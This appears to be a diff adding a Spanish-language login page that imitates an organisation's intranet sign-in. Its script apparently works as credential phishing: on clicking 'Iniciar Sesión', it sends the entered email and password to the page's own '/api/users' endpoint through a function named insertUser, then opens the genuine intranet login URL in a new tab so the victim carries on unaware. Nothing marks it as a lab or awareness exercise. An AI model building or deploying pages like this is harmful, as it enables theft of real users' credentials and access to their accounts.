@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="login-form">
+            <div class="logo"></div>
+            <input class="input" type="text" id="username" placeholder="Correo Electrónico">
+            <div class="password-wrapper">
+                <input class="input" type="password" id="password" placeholder="Clave">
+
+                <span id="togglePassword" class="toggle-icon">
+                    <svg id="iconEye" xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path
+                            d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0" />
+                        <circle cx="12" cy="12" r="3" />
+                    </svg>
+
+                    <svg id="iconEyeOff" class="hidden" xmlns="http://www.w3.org/2000/svg" width="25" height="25"
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path
+                            d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49" />
+                        <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242" />
+                        <path
+                            d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143" />
+                        <path d="m2 2 20 20" />
+                    </svg>
+                </span>
+            </div>
+            <button id="logIn">Iniciar Sesión</button>
+        </div>
+
+        <script>
+            async function insertUser() {
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                const res = await fetch('/api/users', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await res.json();
+                console.log(data);
+            }
+
+            document.querySelector("#logIn").addEventListener('click', insertUser);
+
+            const boton = document.getElementById("logIn");
+
+            boton.addEventListener("click", () => {
+                window.open("https://intranet.maestriontrack.com/user/index.php", "_blank");
+            });
+
+            const passwordInput = document.getElementById("password");
+            const toggle = document.getElementById("togglePassword");
+            const iconEye = document.getElementById("iconEye");
+            const iconEyeOff = document.getElementById("iconEyeOff");
+
+            toggle.addEventListener("click", () => {
+                const isHidden = passwordInput.type === "password";
+
+                passwordInput.type = isHidden ? "text" : "password";
+
+                iconEye.classList.toggle("hidden", isHidden);
+                iconEyeOff.classList.toggle("hidden", !isHidden);
+            });
+        </script>
+</body>
+
+</html>
